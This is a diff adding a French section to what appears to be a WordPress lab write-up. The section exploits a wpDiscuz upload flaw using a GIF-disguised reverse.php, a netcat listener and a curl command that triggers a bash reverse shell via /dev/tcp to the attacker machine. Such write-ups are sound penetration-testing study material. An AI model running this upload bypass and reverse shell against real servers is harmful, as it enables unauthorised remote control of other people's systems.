@@ -146,6 +146,37 @@ wpscan --url http://192.168.1.4/assets/fonts/blog --plugins-detection mixed --en
 
 ---
 
+## 🚀 5. Exploitation de la Faille Critique wpDiscuz
+
+### 🎯 Exploitation de la Vulnérabilité d’Upload de Fichier
+Après avoir identifié la vulnérabilité critique sur **wpDiscuz**, nous allons tenter d’exploiter l’upload de fichiers malveillants.
+
+### 📂 Étape 1 : Création du Fichier Malveillant
+Dans le fichier `reverse.php`, nous ajoutons une signature GIF pour contourner les restrictions :
+
+![image4](https://github.com/user-attachments/assets/6a7da93c-c14b-4139-a91b-6ba34dc72eac)
+
+### ⏳ Étape 2 : Lancement d’une Écoute sur Kali
+Nous démarrons un listener Netcat sur le port `4444` :
+
+nc -lvnp 4444
+
+![image9](https://github.com/user-attachments/assets/55122fb4-63fc-4e00-b0b8-3cc3cee4f63a)
+
+### 📤 Étape 3 : Upload du Fichier Malveillant
+Nous utilisons la vulnérabilité du plugin pour uploader `reverse.php` sur le serveur WordPress.
+
+![image6](https://github.com/user-attachments/assets/68bcf9ac-ec3c-42bf-bf33-27758463a259)
+
+### 🎉 Étape 4 : Prise de Contrôle
+Une fois le fichier uploadé, nous exécutons la commande suivante pour déclencher le shell inversé :
+
+curl "http://192.168.1.4/assets/fonts/blog/wp-content/uploads/reverse.php?cmd=bash -c 'bash -i >& /dev/tcp/192.168.1.X/4444 0>&1'"
+
+✅ **Nous obtenons un shell interactif sur la machine cible !**
+
+---
+
 ## ⚠️ 5. Exploitation Potentielle et Risques
 
 ### 🔑 Vulnérabilités Identifiées
